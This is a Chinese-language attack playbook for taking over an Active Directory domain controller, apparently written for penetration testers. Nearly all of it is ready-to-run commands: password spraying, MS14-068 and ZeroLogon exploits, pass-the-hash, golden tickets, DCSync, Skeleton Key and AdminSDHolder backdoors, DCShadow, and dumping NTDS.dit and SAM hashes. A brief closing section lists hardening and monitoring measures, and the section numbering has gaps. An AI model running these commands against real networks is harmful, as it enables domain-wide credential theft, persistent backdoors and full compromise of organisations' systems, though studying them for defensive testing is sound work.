# 接管域控

域控制器(Domain Controller)是AD域环境的中心，接管域控意味着完全控制整个域环境。本文档涵盖域控夺取的技术和防御方法。

## 1 域控信息收集

### 1.1 定位域控

```powershell
# 使用PowerView
Import-Module .\PowerView.ps1

# 获取域控制器
Get-NetDomainController
Get-NetDomainController -Domain target.local

# 使用AD Module
Get-ADDomainController -Discover
Get-ADDomainController | Select-Object Name,HostComputedDiscovery,OperatingSystem

# DNS查询
nslookup -type=SRV _ldap._tcp.dc._msdcs.target.local

# nltest
nltest /dclist:target.local
nltest /dcname:target.local
```

### 1.2 域控服务检测

```powershell
# 检测LDAP服务
Test-NetConnection target_dc -Port 389

# 检测SMB
Test-NetConnection target_dc -Port 445

# 检测RPC
Test-NetConnection target_dc -Port 135

# 检测GC (Global Catalog)
Test-NetConnection target_dc -Port 3268
```

### 2.2 密码喷洒攻击

```bash
# 使用 CrackMapExec
crackmapexec smb target_dc -u users.txt -p Password123!

# 使用 Kerbrute
./kerbrute passwordspray -d target.local --users users.txt Password123!

# 使用 Rubeus
Rubeus.exe brute /password:Password123! /users:users.txt /domain:target.local

# 使用 Metasploit
use auxiliary/scanner/smb/smb_login
set PASS_FILE passwords.txt
set USER_FILE users.txt
```

### 2.3 MS14-068 (Kerberos漏洞)

```cmd
# 使用 GoldenPac
python goldenPac.py target.local/normal_user:password@target_dc

# 使用 CVE-2014-6324 利用
# 下载 MS14-068.py
python ms14-068.py -u user@domain -p password -d target_dc -s user_sid

# 生成票据
mimikatz # kerberos::ptc [kirbi_file]
```

### 2.4 ZeroLogon (CVE-2020-1472)

```bash
# 检测 ZeroLogon
python zerologon_tester.py target_dc <计算机账户>

# 利用
python cve-2020-1472.py target_dc <计算机账户>

# 使用 Impacket
python secretsdump.py target.local/computer_account@target_dc -just-dc

# 恢复密码 (利用后必须)
python restorepassword.py target.local/computer_account@target_dc -target-ip target_dc -hex [恢复的哈希]
```

## 3 域控横向移动

### 3.1 PTH到域控

```cmd
# 使用Mimikatz传递哈希
mimikatz # sekurlsa::pth /user:administrator /domain:target.local /ntlm:<dc_hash> /run:cmd.exe

# 使用WMIC
wmic /node:target_dc /user:target\administrator /password:password process call create "cmd.exe /c calc"

# 使用 PsExec
psexec.exe \\target_dc -u target\administrator -p password cmd.exe

# 使用 WMI
Invoke-WmiMethod -ComputerName target_dc -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc"
```

### 3.2 PSEXEC和WMI到域控

```bash
# Impacket psexec
python psexec.py target.local/administrator@target_dc

# CrackMapExec
crackmapexec smb target_dc -u administrator -H <hash> -x whoami

# CrackMapExec 执行Mimikatz
crackmapexec smb target_dc -u administrator -H <hash> -M mimikatz
```

## 4 域控持久化

### 4.1 黄金票据

```cmd
# 获取KRBTGT哈希
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt

# 创建黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ticket:golden.kirbi

# 注入票据
mimikatz # kerberos::ptt golden.kirbi

# 验证
mimikatz # kerberos::tgt
```

### 4.2 DCSync攻击

```cmd
# 使用Mimikatz
mimikatz # lsadump::dcsync /domain:target.local /user:administrator
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt

# 使用Impacket
python secretsdump.py target.local/username:password@target_dc

# 在已有会话中
mimikatz # lsadump::dcsync /all
```

### 4.3 域控后门

####Skeleton Key (万能钥匙)

```cmd
# 需要域控高权限
mimikatz # privilege::debug
mimikatz # misc::skeleton

# 之后可以使用 "mimikatz" 作为任何用户的密码
```

####委派后门

```powershell
# 设置约束委派
Set-ADUser -Identity target_computer -PrincipalsAllowedToDelegateToAccount attacker_computer$

# 或者使用Rubeus
Rubeus.exe tgtdeleg /ticket:[base64]
```

### 5.2 DCShadow

```cmd
# 需要两个阶段的Mimikatz操作

# 阶段1: 注册服务 (普通用户权限)
mimikatz # sekurlsa::ticket
mimikatz # lsadump::dcshadow /object:CN=DCName,OU=Domain Controllers,DC=target,DC=local /seed:计算机密码hex

# 阶段2: 推送修改 (需要域控权限)
lsadump::dcshadow /push
```

### 5.3 AdminSDHolder滥用

```powershell
# 修改 AdminSDHolder 的 ACL
# 添加后门账户的完全控制权限

# 使用 PowerView
Add-DomainObjectACL -TargetSearchBase "CN=AdminSDHolder,CN=System,DC=target,DC=local" -TargetIdentity "Administrators" -PrincipalIdentity backdoor_user -Rights All

# 验证
Get-DomainObjectACL -SearchBase "CN=AdminSDHolder,CN=System,DC=target,DC=local" | ? {$_.SecurityIdentifier -match "backdoor_user"}
```

## 6 域控数据提取

### 6.1 哈希转储

```cmd
# DCSync导出所有哈希
mimikatz # lsadump::dcsync /domain:target.local /all

# 导出NTDS.dit
# 方式1: 使用 volume shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM C:\temp\SAM

# 方式2: 使用 ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q

# 方式3: 使用Impacket
python esentutl.py /y /vss target_dc
```

### 6.2 域数据提取

```powershell
# 使用 PowerSploit
# 导出域用户
Get-NetUser | Export-Csv users.csv

# 导出域计算机
Get-NetComputer | Export-Csv computers.csv

# 导出组信息
Get-NetGroup "Domain Admins" | Export-Csv domain_admins.csv

# 导出GPO
Get-GPO -All | ForEach-Object { [System.IO.File]::WriteAllText("$($_.DisplayName).xml", $_.Xml) }
```

### 6.3 使用secretsdump提取

```bash
# 使用Impacket的secretsdump
python secretsdump.py target.local/username:password@target_dc

# 仅导出SAM
python secretsdump.py -sam sam_file -system system_file LOCAL

# 导出LSASS
python secretsdump.py -security security_file -system system_file LOCAL

# 使用NTDS
python secretsdump.py -ntds ntds.dit -system system_file LOCAL
```

## 8 防御措施

### 8.1 域控安全配置

```powershell
# 1. 限制域管登录
#    使用 GPO 限制登录到特定机器
#    计算机配置 -> Windows 设置 -> 安全设置 -> 用户权限分配 -> 允许本地登录

# 2. 启用 SMB 签名
#    计算机配置 -> 安全设置 -> 本地策略 -> 安全选项
#    "微软网络客户端: 数字签名通信(始终)"

# 3. 禁用 NTLM
#    网络安全: 限制 NTLM 认证
#    使用 Kerberos 预认证

# 4. 启用 LDAP 签名
#    "域控制器: LDAP 客户端签名要求"

# 5. 监控敏感组成员变更
#    启用安全日志
#    设置警报

# 6. 定期检查 AD ACL
#    使用 PowerSploit 检查异常权限
#    定期审计 AdminSDHolder
```

### 8.2 账户安全

```powershell
# 1. KRBTGT密码重置
#    重置两次（间隔需大于当前票据最长生命周期）
Reset-ADAccountPassword -Identity krbtgt -WhatIf
#    建议在重置后检查票据是否清除

# 2. 禁用不必要的协议
#    禁用 LM 认证
#    设置最小 Kerberos 加密级别

# 3. 密码策略
#    强制密码复杂度和长度
#    禁止密码重用
#    定期更换

# 4. 特权账户保护
#    使用 Protected Users 安全组
#    启用smart卡认证
```

### 8.3 监控部署

```powershell
# 1. Sysmon 部署
#    配置 Sysmon 收集关键事件

# 2. 日志集中
#    部署 Windows Event Forwarding
#    使用 SIEM 平台分析

# 3. 关键事件监控
#    4624: 登录
#    4627: 组分配
#    4672: 特权分配
#    4732: 安全组成员添加
#    4740: 账户锁定
#    4771: Kerberos预认证失败
#    4776: NTLM登录验证
```
